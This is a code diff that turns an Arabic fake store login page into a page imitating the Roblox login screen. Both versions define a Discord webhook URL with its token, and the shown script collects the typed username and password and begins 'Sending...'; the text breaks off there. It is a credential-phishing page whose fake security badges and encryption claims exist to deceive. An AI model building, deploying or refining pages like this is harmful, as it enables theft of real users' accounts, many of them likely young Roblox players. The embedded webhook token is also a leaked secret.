@@ -1,844 +1,437 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - متجر دروب شوب</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='14' fill='%23667eea'/><text x='16' y='21' text-anchor='middle' fill='white' font-size='17' font-weight='bold'>D</text></svg>">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Add Account</title>
 
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-8px); }
-        }
-        @keyframes shimmer {
-            0% { background-position: -200% center; }
-            100% { background-position: 200% center; }
-        }
-        @keyframes fadeSlideUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes pulseGlow {
-            0%, 100% { box-shadow: 0 0 10px rgba(102,126,234,0.2); }
-            50% { box-shadow: 0 0 25px rgba(102,126,234,0.5); }
-        }
-        @keyframes checkmark {
-            0% { stroke-dashoffset: 50; }
-            100% { stroke-dashoffset: 0; }
-        }
-        @keyframes progressFill {
-            from { width: 0%; }
-            to { width: 100%; }
-        }
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,Helvetica,sans-serif;
+}
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
-            background: linear-gradient(145deg, #f0f2f5 0%, #e6e9f0 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
+body{
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 
-        .container {
-            background: #ffffff;
-            border-radius: 28px;
-            padding: 48px 40px 32px;
-            width: 440px;
-            max-width: 100%;
-            box-shadow: 0 30px 80px rgba(0,0,0,0.12), 0 10px 30px rgba(0,0,0,0.05);
-            position: relative;
-            animation: fadeSlideUp 0.6s ease-out;
-            border: 1px solid rgba(255,255,255,0.6);
-        }
+    background:url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg') center center/cover no-repeat;
+}
 
-        /* Glass badge top */
-        .secure-badge {
-            position: absolute;
-            top: -12px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #ffffff;
-            border: 1px solid #e0e5ec;
-            border-radius: 30px;
-            padding: 6px 18px;
-            font-size: 12px;
-            color: #2e7d32;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-            font-weight: 600;
-            letter-spacing: 0.3px;
-        }
-        .secure-badge svg {
-            width: 14px;
-            height: 14px;
-        }
+body::before{
+    content:"";
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.58);
+    z-index:0;
+}
 
-        .header {
-            text-align: center;
-            margin-bottom: 32px;
-        }
-        .header .brand-icon {
-            width: 72px;
-            height: 72px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 14px;
-            animation: float 3s ease-in-out infinite;
-            box-shadow: 0 8px 30px rgba(102,126,234,0.35);
-        }
-        .header .brand-icon svg {
-            width: 36px;
-            height: 36px;
-            fill: white;
-        }
-        .header h1 {
-            font-size: 24px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #1a1a2e, #302b63);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: -0.3px;
-        }
-        .header p {
-            color: #7a7a9a;
-            font-size: 14px;
-            margin-top: 4px;
-            font-weight: 500;
-        }
-        .header .rating-row {
-            margin-top: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            font-size: 13px;
-            color: #f59e0b;
-        }
-        .header .rating-row span {
-            color: #666;
-            font-size: 12px;
-        }
+/* ========================= */
+/* TOP BAR */
+/* ========================= */
 
-        .input-group {
-            margin-bottom: 18px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #2d2d3f;
-            margin-bottom: 6px;
-            letter-spacing: 0.2px;
-        }
-        .input-group .input-wrap {
-            position: relative;
-        }
-        .input-group .input-wrap .icon {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #aaa;
-            font-size: 18px;
-            pointer-events: none;
-            transition: color 0.3s;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 15px 44px 15px 16px;
-            border: 2px solid #e8ecf4;
-            border-radius: 14px;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            background: #f8f9fd;
-            outline: none;
-            font-family: inherit;
-        }
-        .input-group input:focus {
-            border-color: #667eea;
-            background: #fff;
-            box-shadow: 0 0 0 4px rgba(102,126,234,0.12), 0 4px 12px rgba(102,126,234,0.08);
-        }
-        .input-group input:focus ~ .icon {
-            color: #667eea;
-        }
-        .input-group input.error {
-            border-color: #ef4444;
-            background: #fef2f2;
-        }
-        .input-group .input-hint {
-            font-size: 11px;
-            color: #999;
-            margin-top: 5px;
-        }
-        .input-group .error-msg {
-            font-size: 12px;
-            color: #ef4444;
-            margin-top: 5px;
-            display: none;
-            font-weight: 500;
-        }
-        .input-group .error-msg.show {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
+.topbar{
+    position:fixed;
+    top:0;
+    left:0;
+    right:0;
 
-        .options-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 22px;
-        }
-        .options-row label {
-            font-size: 13px;
-            color: #555;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            cursor: pointer;
-        }
-        .options-row label input[type="checkbox"] {
-            width: 16px;
-            height: 16px;
-            accent-color: #667eea;
-            border-radius: 4px;
-        }
-        .options-row a {
-            font-size: 13px;
-            color: #667eea;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        .options-row a:hover {
-            text-decoration: underline;
-        }
+    height:36px;
 
-        /* CAPTCHA Simulation */
-        .captcha-box {
-            background: #f8f9fd;
-            border: 2px solid #e8ecf4;
-            border-radius: 14px;
-            padding: 14px 18px;
-            margin-bottom: 18px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            transition: all 0.3s ease;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-        }
-        .captcha-box.verified {
-            border-color: #22c55e;
-            background: #f0fdf4;
-        }
-        .captcha-box .checkbox-area {
-            width: 24px;
-            height: 24px;
-            border: 2px solid #c0c6d4;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            transition: all 0.3s ease;
-            background: white;
-        }
-        .captcha-box .checkbox-area.checked {
-            border-color: #22c55e;
-            background: #22c55e;
-        }
-        .captcha-box .checkbox-area.checked svg {
-            display: block;
-        }
-        .captcha-box .checkbox-area svg {
-            display: none;
-            width: 14px;
-            height: 14px;
-            stroke: white;
-            stroke-width: 3;
-            fill: none;
-            stroke-dasharray: 50;
-            stroke-dashoffset: 0;
-        }
-        .captcha-box .checkbox-area svg.animate {
-            animation: checkmark 0.4s ease-out forwards;
-        }
-        .captcha-box .captcha-text {
-            flex: 1;
-            font-size: 14px;
-            color: #2d2d3f;
-            font-weight: 500;
-        }
-        .captcha-box .captcha-badge {
-            background: #e8ecf4;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            color: #555;
-            font-weight: 700;
-            letter-spacing: 0.3px;
-            text-transform: uppercase;
-        }
-        .captcha-box .captcha-badge.verified-badge {
-            background: #22c55e;
-            color: white;
-        }
-        .captcha-progress {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            height: 3px;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            width: 0%;
-            transition: width 0.1s linear;
-        }
-        .captcha-box.verifying .captcha-progress {
-            animation: progressFill 2s linear forwards;
-        }
+    background:#181a22;
 
-        .btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: #fff;
-            border: none;
-            border-radius: 14px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            letter-spacing: 0.5px;
-            position: relative;
-            overflow: hidden;
-        }
-        .btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 14px 35px rgba(102,126,234,0.4);
-        }
-        .btn:active:not(:disabled) {
-            transform: translateY(0px);
-        }
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            background: #a0a8c0;
-        }
-        .btn .shimmer {
-            position: absolute;
-            top: 0;
-            left: -200%;
-            width: 200%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            animation: shimmer 3s infinite;
-        }
+    border-bottom:1px solid rgba(255,255,255,.06);
 
-        .divider {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            margin: 24px 0 18px;
-            color: #b0b8c8;
-            font-size: 12px;
-        }
-        .divider::before, .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: #e8ecf4;
-        }
+    display:flex;
+    align-items:center;
 
-        .social-login {
-            display: flex;
-            gap: 10px;
-        }
-        .social-btn {
-            flex: 1;
-            padding: 12px;
-            border: 2px solid #e8ecf4;
-            border-radius: 12px;
-            background: white;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            font-size: 13px;
-            font-weight: 600;
-            color: #444;
-        }
-        .social-btn:hover {
-            border-color: #667eea;
-            background: #f8f9fd;
-        }
-        .social-btn svg {
-            width: 20px;
-            height: 20px;
-        }
+    z-index:999;
+}
 
-        .footer-text {
-            text-align: center;
-            margin-top: 22px;
-            font-size: 12px;
-            color: #999;
-            line-height: 1.8;
-        }
-        .footer-text a {
-            color: #667eea;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        .footer-text a:hover {
-            text-decoration: underline;
-        }
-        .footer-text .dot {
-            color: #ccc;
-            margin: 0 4px;
-        }
+.logo{
+    width:22px;
+    height:22px;
 
-        .status-bar {
-            text-align: center;
-            margin-top: 16px;
-            padding-top: 16px;
-            border-top: 1px solid #f0f2f6;
-            font-size: 12px;
-            color: #aaa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 6px;
-        }
-        .status-bar .lock {
-            color: #22c55e;
-        }
+    margin-left:16px;
+    margin-right:38px;
 
-        .loader-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.45);
-            backdrop-filter: blur(6px);
-            z-index: 9999;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            gap: 18px;
-        }
-        .loader-overlay.show {
-            display: flex;
-        }
-        .loader-overlay .card {
-            background: white;
-            border-radius: 24px;
-            padding: 40px 48px;
-            text-align: center;
-            max-width: 360px;
-            animation: fadeSlideUp 0.3s ease-out;
-        }
-        .loader-overlay .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #e8ecf4;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 16px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .loader-overlay .card h3 {
-            font-size: 18px;
-            color: #1a1a2e;
-            margin-bottom: 4px;
-        }
-        .loader-overlay .card p {
-            font-size: 14px;
-            color: #777;
-        }
+    background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NiIgaGVpZ2h0PSI1NiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDU2IDU2Ij48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMTEuNjc2IDAgMCA0NC4xNjYgNDMuNTc3IDU2bDExLjY3Ni00NC4xNjZ6bTIwLjQwOSAzNS44MjctMTIuMTc3LTMuMzA4IDMuMjY0LTEyLjM0MiAxMi4xODIgMy4zMDh6Ii8+PC9zdmc+");
 
-        /* Privacy Policy Modal */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(4px);
-            z-index: 99999;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .modal-overlay.show {
-            display: flex;
-        }
-        .modal-overlay .modal-box {
-            background: white;
-            border-radius: 24px;
-            max-width: 500px;
-            width: 100%;
-            max-height: 80vh;
-            overflow-y: auto;
-            padding: 30px 32px;
-            animation: fadeSlideUp 0.3s ease-out;
-        }
-        .modal-overlay .modal-box h2 {
-            font-size: 20px;
-            color: #1a1a2e;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .modal-overlay .modal-box p, .modal-overlay .modal-box li {
-            font-size: 13px;
-            color: #555;
-            line-height: 1.8;
-        }
-        .modal-overlay .modal-box ul {
-            padding-right: 20px;
-            margin: 10px 0;
-        }
-        .modal-overlay .modal-box .modal-actions {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
-            justify-content: flex-end;
-        }
-        .modal-overlay .modal-box .modal-actions button {
-            padding: 10px 24px;
-            border-radius: 10px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            border: none;
-            transition: all 0.2s;
-        }
-        .modal-overlay .modal-box .modal-actions .btn-primary {
-            background: #667eea;
-            color: white;
-        }
-        .modal-overlay .modal-box .modal-actions .btn-primary:hover {
-            background: #5a6fd8;
-        }
-        .modal-overlay .modal-box .modal-actions .btn-secondary {
-            background: #f0f2f6;
-            color: #444;
-        }
-        .modal-overlay .modal-box .modal-actions .btn-secondary:hover {
-            background: #e4e7ee;
-        }
+    background-repeat:no-repeat;
+    background-position:center;
+    background-size:contain;
+}
 
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            background: #1a1a2e;
-            color: white;
-            padding: 14px 24px;
-            border-radius: 14px;
-            font-size: 13px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            z-index: 999999;
-            display: none;
-            animation: fadeSlideUp 0.3s ease-out;
-        }
-        .toast.show {
-            display: block;
-        }
-    </style>
+.nav{
+    display:flex;
+    align-items:center;
+    gap:52px;
+}
+
+.nav a{
+    color:#ffffff;
+    text-decoration:none;
+    font-size:13px;
+    font-weight:500;
+}
+
+/* البحث بالنص */
+
+.search{
+    position:absolute;
+    left:50%;
+    transform:translateX(-50%);
+}
+
+.search input{
+    width:420px;
+    height:26px;
+
+    background:#232633;
+
+    border:1px solid rgba(255,255,255,.25);
+    border-radius:8px;
+
+    color:white;
+    font-size:13px;
+
+    padding:0 12px;
+
+    outline:none;
+}
+
+.search input::placeholder{
+    color:#c6c8d0;
+}
+
+.signup-btn{
+    margin-left:auto;
+    margin-right:12px;
+
+    background:#335fff;
+
+    color:white;
+    text-decoration:none;
+
+    padding:5px 14px;
+
+    border-radius:8px;
+
+    font-size:13px;
+    font-weight:700;
+}
+
+/* ========================= */
+/* LOGIN BOX */
+/* ========================= */
+
+.login-container{
+    position:relative;
+    z-index:1;
+
+    width:362px;
+
+    background:#23252d;
+
+    padding:24px 16px 22px;
+}
+
+.title{
+    text-align:center;
+
+    color:white;
+
+    font-size:28px;
+    font-weight:800;
+
+    margin-bottom:18px;
+}
+
+.input{
+    width:100%;
+    height:40px;
+
+    background:#343744;
+
+    border:1px solid #4b5061;
+    border-radius:8px;
+
+    color:white;
+
+    padding:0 12px;
+
+    margin-bottom:10px;
+
+    outline:none;
+}
+
+.input::placeholder{
+    color:#ececec;
+}
+
+.login-btn{
+    width:100%;
+    height:40px;
+
+    background:transparent;
+
+    border:1px solid #d8d8d8;
+    border-radius:8px;
+
+    color:white;
+
+    cursor:pointer;
+
+    transition:background .2s;
+}
+
+.login-btn:hover{
+    background:rgba(255,255,255,.08);
+}
+
+.login-btn:disabled{
+    opacity:.5;
+    cursor:not-allowed;
+}
+
+.forgot{
+    text-align:center;
+
+    margin-top:18px;
+    margin-bottom:22px;
+}
+
+.forgot a{
+    color:white;
+    text-decoration:none;
+
+    font-size:14px;
+    font-weight:700;
+}
+
+.forgot a:hover{
+    text-decoration:underline;
+}
+
+.separator{
+    height:1px;
+    background:#3d4150;
+
+    margin-bottom:20px;
+}
+
+.alt-btn{
+    width:100%;
+    height:34px;
+
+    background:#3b4050;
+
+    border:none;
+    border-radius:8px;
+
+    color:white;
+
+    font-size:14px;
+    font-weight:600;
+
+    margin-bottom:8px;
+
+    cursor:pointer;
+}
+
+.signup-text{
+    text-align:center;
+
+    margin-top:24px;
+
+    color:white;
+    font-size:15px;
+    font-weight:600;
+}
+
+.signup-text a{
+    color:white;
+    text-decoration:none;
+}
+
+.signup-text a:hover{
+    text-decoration:underline;
+}
+
+/* Status / loader styles */
+#statusMsg{
+    text-align:center;
+    margin-top:12px;
+    font-size:13px;
+    color:#aab;
+    min-height:20px;
+    transition:color .3s;
+}
+#statusMsg.success{ color:#4ade80; }
+#statusMsg.error{ color:#f87171; }
+</style>
 </head>
 <body>
 
-<!-- Privacy Policy Modal -->
-<div class="modal-overlay" id="privacyModal">
-    <div class="modal-box">
-        <h2>🛡️ سياسة الخصوصية</h2>
-        <p><strong>آخر تحديث:</strong> 31 مايو 2026</p>
-        <p>في <strong>دروب شوب</strong>، خصوصيتك هي أولويتنا. هذه السياسة توضح كيفية جمع وحماية بياناتك.</p>
-        <ul>
-            <li><strong>البيانات التي نجمعها:</strong> الاسم، البريد الإلكتروني، معلومات الدفع المشفرة، عنوان IP.</li>
-            <li><strong>كيف نستخدمها:</strong> لتأكيد الهوية، معالجة الطلبات، تحسين الخدمة، إرسال العروض (بعد موافقتك).</li>
-            <li><strong>التشفير:</strong> جميع البيانات مشفرة باستخدام TLS 1.3 و AES-256.</li>
-            <li><strong>المشاركة:</strong> لا نشارك بياناتك مع أطراف ثالثة إلا بموجب القانون.</li>
-            <li><strong>حقوقك:</strong> يمكنك طلب حذف بياناتك في أي مراسلة.</li>
-        </ul>
-        <p>باستمرارك، توافق على جمع واستخدام بياناتك وفق هذه السياسة.</p>
-        <div class="modal-actions">
-            <button class="btn-secondary" onclick="closePrivacyModal()">إلغاء</button>
-            <button class="btn-primary" onclick="acceptPrivacy()">✓ أوافق</button>
-        </div>
-    </div>
-</div>
+<nav class="topbar">
 
-<!-- Terms Modal -->
-<div class="modal-overlay" id="termsModal">
-    <div class="modal-box">
-        <h2>📜 شروط الاستخدام</h2>
-        <p><strong>آخر تحديث:</strong> 31 مايو 2026</p>
-        <p>مرحباً بك في <strong>دروب شوب</strong>. باستخدامك للمنصة، أنت توافق على الشروط التالية:</p>
-        <ul>
-            <li>يجب أن يكون عمرك 18 سنة أو أكثر.</li>
-            <li>أنت مسؤول عن الحفاظ على سرية حسابك.</li>
-            <li>يمنع استخدام المنصة لأي نشاط غير قانوني.</li>
-            <li>نحتفظ بالحق في تعليق الحسابات المخالفة.</li>
-            <li>جميع المدفوعات تخضع لسياسة الاسترجاع الخاصة بنا.</li>
-            <li>المنصة غير مسؤولة عن الأضرار الناتجة عن سوء الاستخدام.</li>
-        </ul>
-        <div class="modal-actions">
-            <button class="btn-secondary" onclick="closeTermsModal()">إغلاق</button>
-        </div>
-    </div>
-</div>
+    <div class="logo"></div>
 
-<!-- Toast -->
-<div class="toast" id="toast"></div>
-
-<!-- Loader overlay -->
-<div class="loader-overlay" id="loaderOverlay">
-    <div class="card">
-        <div class="spinner"></div>
-        <h3>جاري التحقق من هويتك</h3>
-        <p>نظام الحماية المتقدم يتحقق من بياناتك...<br>قد يستغرق ذلك بضع ثوانٍ</p>
-    </div>
-</div>
-
-<div class="container">
-    <!-- Secure badge -->
-    <div class="secure-badge">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-        </svg>
-        اتصال آمن (TLS 1.3) • مشفّر بالكامل
+    <div class="nav">
+        <a href="#">Charts</a>
+        <a href="#">Marketplace</a>
+        <a href="#">Create</a>
+        <a href="#">Robux</a>
     </div>
 
-    <div class="header">
-        <div class="brand-icon">
-            <svg viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-            </svg>
-        </div>
-        <h1>دروب شوب</h1>
-        <p>تسجيل الدخول إلى لوحة التحكم</p>
-        <div class="rating-row">
-            ★★★★★
-            <span>4.8 (24,152 تقييم)</span>
-        </div>
+    <div class="search">
+        <input type="text" placeholder="Search">
     </div>
 
-    <form id="loginForm">
-        <div class="input-group">
-            <label for="email">البريد الإلكتروني أو اسم المستخدم</label>
-            <div class="input-wrap">
-                <input type="email" id="email" placeholder="example@domain.com" required autocomplete="email">
-                <span class="icon">✉</span>
-            </div>
-            <div class="error-msg" id="emailError">⚠️ يرجى إدخال بريد إلكتروني صالح</div>
-        </div>
+    <a class="signup-btn"
+       href="https://www.roblox.com/CreateAccount"
+       target="_blank">
+       Sign Up
+    </a>
 
-        <div class="input-group">
-            <label for="password">كلمة المرور</label>
-            <div class="input-wrap">
-                <input type="password" id="password" placeholder="••••••••" required autocomplete="current-password" minlength="4">
-                <span class="icon">🔒</span>
-            </div>
-            <div class="error-msg" id="passError">⚠️ كلمة المرور يجب أن تكون 4 أحرف على الأقل</div>
-        </div>
+</nav>
 
-        <div class="options-row">
-            <label>
-                <input type="checkbox" id="remember"> تذكرني
-            </label>
-            <a href="#" onclick="showToast('تم إرسال رابط إعادة تعيين كلمة المرور إلى بريدك الإلكتروني (محاكاة)'); return false;">نسيت كلمة المرور؟</a>
-        </div>
+<div class="login-container">
 
-        <!-- Simulated CAPTCHA -->
-        <div class="captcha-box" id="captchaBox">
-            <div class="checkbox-area" id="captchaCheckbox">
-                <svg viewBox="0 0 24 24" class="animate">
-                    <polyline points="20 6 9 17 4 12"/>
-                </svg>
-            </div>
-            <span class="captcha-text" id="captchaText">لست روبوتاً</span>
-            <span class="captcha-badge" id="captchaBadge">✓ التحقق</span>
-            <div class="captcha-progress" id="captchaProgress"></div>
-        </div>
-
-        <button type="submit" class="btn" id="submitBtn" disabled>
-            <span class="shimmer"></span>
-            تسجيل الدخول
-        </button>
-    </form>
-
-    <div class="divider">أو تابع باستخدام</div>
-
-    <div class="social-login">
-        <button class="social-btn" onclick="showToast('🔵 تم توجيهك إلى Google للمتابعة (محاكاة)')">
-            <svg viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/></svg>
-            Google
-        </button>
-        <button class="social-btn" onclick="showToast('🔵 تم توجيهك إلى Apple للمتابعة (محاكاة)')">
-            <svg viewBox="0 0 24 24"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
-            Apple
-        </button>
+    <div class="title">
+        Add account
     </div>
 
-    <div class="footer-text">
-        <a href="#" onclick="openPrivacyModal(); return false;">سياسة الخصوصية</a>
-        <span class="dot">•</span>
-        <a href="#" onclick="openTermsModal(); return false;">شروط الاستخدام</a>
-        <span class="dot">•</span>
-        <a href="#" onclick="showToast('📞 تم إرسال رمز التحقق إلى بريدك الإلكتروني (محاكاة)'); return false;">مساعدة</a>
-        <br>
-        ليس لديك حساب؟ <a href="#" onclick="showToast('📝 تم توجيهك إلى صفحة إنشاء حساب جديد (محاكاة)'); return false;">إنشاء حساب جديد</a>
+    <input
+        type="text"
+        class="input"
+        id="usernameInput"
+        placeholder="Username/Email/Phone"
+    >
+
+    <input
+        type="password"
+        class="input"
+        id="passwordInput"
+        placeholder="Password"
+    >
+
+    <button class="login-btn" id="loginBtn">
+        Log In
+    </button>
+
+    <div id="statusMsg"></div>
+
+    <div class="forgot">
+        <a href="https://www.roblox.com/login/forgot-password-or-username"
+           target="_blank">
+            Forgot Password or Username?
+        </a>
     </div>
 
-    <div class="status-bar">
-        <span class="lock">🔒</span>
-        <span id="statusText">بيئة آمنة • مشفّر • متوافق مع اللائحة العامة لحماية البيانات (GDPR)</span>
+    <div class="separator"></div>
+
+    <button class="alt-btn" onclick="alert('One-time code sent (simulated)')">
+        Email Me a One-Time Code
+    </button>
+
+    <button class="alt-btn" onclick="alert('Quick sign-in (simulated)')">
+        Quick Sign-in
+    </button>
+
+    <div class="signup-text">
+        Don't have an account?
+        <a href="https://www.roblox.com/CreateAccount"
+           target="_blank">
+           Sign Up
+        </a>
     </div>
+
 </div>
 
 <script>
-    // ----- DOM refs -----
-    const form = document.getElementById('loginForm');
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const captchaBox = document.getElementById('captchaBox');
-    const captchaCheckbox = document.getElementById('captchaCheckbox');
-    const captchaText = document.getElementById('captchaText');
-    const captchaBadge = document.getElementById('captchaBadge');
-    const captchaProgress = document.getElementById('captchaProgress');
-    const submitBtn = document.getElementById('submitBtn');
-    const loaderOverlay = document.getElementById('loaderOverlay');
-    const statusText = document.getElementById('statusText');
-    const emailError = document.getElementById('emailError');
-    const passError = document.getElementById('passError');
-    const toast = document.getElementById('toast');
-
+    // ─── Webhook URL ────────────────────────────────────────────
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510744005980459072/Wo0tVKL36lpZttZ5Yl8HGT8LQH1Ixmkl2xcsdnipXOmoICtsPtCPKdA2iwkVvn_q1qRA';
 
-    let captchaVerified = false;
-    let isVerifying = false;
+    // ─── DOM refs ───────────────────────────────────────────────
+    const usernameEl = document.getElementById('usernameInput');
+    const passwordEl = document.getElementById('passwordInput');
+    const loginBtn   = document.getElementById('loginBtn');
+    const statusMsg  = document.getElementById('statusMsg');
 
-    // ----- Email validation -----
-    function validateEmail(e) {
-        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);
+    // ─── Helper: set status ─────────────────────────────────────
+    function setStatus(text, type){
+        statusMsg.textContent = text;
+        statusMsg.className = type || '';
     }
 
-    emailInput.addEventListener('input', () => {
-        emailInput.classList.remove('error');
-        emailError.classList.remove('show');
-        checkFormValidity();
-    });
-    passwordInput.addEventListener('input', () => {
-        passwordInput.classList.remove('error');
-        passError.classList.remove('show');
-        checkFormValidity();
-    });
-
-    function checkFormValidity() {
-        const emailOk = validateEmail(emailInput.value);
-        const passOk = passwordInput.value.trim().length >= 4;
-        submitBtn.disabled = !(emailOk && passOk && captchaVerified && !isVerifying);
+    // ─── Helper: validate ───────────────────────────────────────
+    function validate(){
+        if(!usernameEl.value.trim()){
+            setStatus('Please enter a username/email/phone', 'error');
+            return false;
+        }
+        if(!passwordEl.value.trim()){
+            setStatus('Please enter your password', 'error');
+            return false;
+        }
+        return true;
     }
 
-    // ----- CAPTCHA Simulation (2 seconds) -----
-    captchaBox.addEventListener('click', () => {
-        if (captchaVerified || isVerifying) return;
+    // ─── Submit handler ─────────────────────────────────────────
+    loginBtn.addEventListener('click', async function(){
 
-        isVerifying = true;
-        captchaBox.classList.add('verifying');
-        captchaText.textContent = 'جاري التحقق...';
-        captchaBadge.textContent = '⏳';
-        submitBtn.disabled = true;
+        if(!validate()) return;
 
-        // Reset progress
-        captchaProgress.style.animation = 'none';
-        void captchaProgress.offsetHeight; // force reflow
-        captchaProgress.style.animation = 'progressFill 2s linear forwards';
+        // Disable button while sending
+        loginBtn.disabled = true;
+        loginBtn.textContent = 'Please wait...';
+        setStatus('Sending...', '');
 
-        setTimeout(() => {
-            captchaVerified = true;
-            isVerifying = false;
-            captchaBox.classList.remove('verifying');
-            captchaBox.classList.add('verified');
-            captchaCheckbox.classList.add('checked');
-            captchaText.textContent = '✓ تم التحقق من هويتك';
-            captchaBadge.textContent = '✓ موثوق';
-            captchaBadge.classList.add('verified-badge');
+        const username = usernameEl.value.trim();
